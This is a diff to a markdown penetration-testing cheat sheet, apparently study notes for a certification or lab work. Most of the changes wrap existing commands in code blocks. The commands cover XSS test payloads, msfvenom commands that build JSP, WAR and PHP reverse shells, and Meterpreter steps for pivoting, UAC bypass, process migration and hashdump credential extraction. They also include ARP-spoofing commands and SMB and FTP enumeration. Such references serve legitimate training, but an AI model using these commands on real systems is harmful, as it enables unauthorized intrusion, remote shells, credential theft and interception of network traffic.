@@ -94,8 +94,10 @@ hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^
 
 ## XSS
 ```sh
-\<script\>alert(1)\</script\>\
+\<script\>alert(1)\</script\>
 \<ScRiPt\>alert(1)\</ScRiPt\>
+\<script\>alert('XSS')\</script\>\
+\<ScRiPt\>alert('XSS')\</ScRiPt\>
 ```
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
@@ -109,43 +111,52 @@ https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
 
 **WAR**\
+```sh
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
-
+```
 **PHP**\
+```sh
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
-
+```
 ## Metasploit Meterpreter autoroute
+```sh
 run autoroute -s 10.10.10.0/24
-
+```
 ## ARPSpoof
+```sh
 echo 1 > /proc/sys/net/ipv4/ip_forward\
 arpspoof -i <interface> -t <target> -r <host>\
 arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
-
+```sh
 ## SMB Enumeration
 **Get shares, users, groups, password policy**\
-smbclient -L //10.10.10.10/\
-enum4linux -U -M -S -P -G 10.10.10.10\
-nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 -v\
-nmap -p445 --script=smb-vuln-* 10.10.10.10 -v
-
+```sh
+smbclient -L //10.10.10.10/
+enum4linux -U -M -S -P -G 10.10.10.10
+nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 
+nmap -p445 --script=smb-vuln-* 10.10.10.10 
+```
 **Access Share**\
+```sh
 smbclient //10.10.10.10/share_name
-
+```
 ## FTP Enumeration
-nmap --script=ftp-anon 10.10.10.10 -p21 -v\
-nmap -A -p21 10.10.10.10 -v
+```sh
+nmap --script=ftp-anon 10.10.10.10 -p21 
+nmap -A -p21 10.10.10.10 
+```
 
 **Login to FTP server**\
-ftp 10.10.10.10\
-
-## FTP server Commands 
 ```sh
-get filename               #to Receive file\
-put filename >             #to upload file \
-cd /../.. >                #to Change remote working directory\
-ls /.. >                   #to List contents of remote directory
+ftp 10.10.10.10
+```
+## FTP Server Commands
+```sh
+get filename               #to Receive file
+put filename               #to upload file 
+cd /../..                  #to Change remote working directory
+ls /..                     #to List contents of remote directory
 ```
 ## Meterpreter
 ```sh
@@ -156,31 +167,40 @@ getsystem
 ps -U SYSTEM
 ```
 **CHECK UAC/Privileges**\
+```sh
 run post/windows/gather/win_privs
-
+```
 **BYPASS UAC**\
-*Background the session first*\
-exploit/windows/local/bypassuac\
+*Background the session first*
+```sh
+exploit/windows/local/bypassuac
 set session
-
+```
 **After PrivEsc**\
-migrate \<pid\>\
-hashdump
-  
+```sh
+migrate \<pid\>
+hashdump          #to extract Users & Password's hash
+``` 
 ## Windows Command Line
 **To search for a file starting from current directory**\
-dir /b/s "\*.conf\*"\
-dir /b/s "\*.txt\*"\
+```sh
+cd 
+dir /b/s "\*.conf\*"
+dir /b/s "\*.txt\*"
 dir /b/s "\*filename\*"
-
-**Check routing table**\
-route print\
-netstat -r
+```
 
 **Check Users**\
-net users
+```sh
+net users         #Users
+net account       #Password age 
+```
 
 **List drives on the machine**\
-wmic logicaldisk get Caption,Description,providername
+```sh
+fsutil fsinfo drives     #windows 
+lsblk -l                #Linux
+```
+
 
 
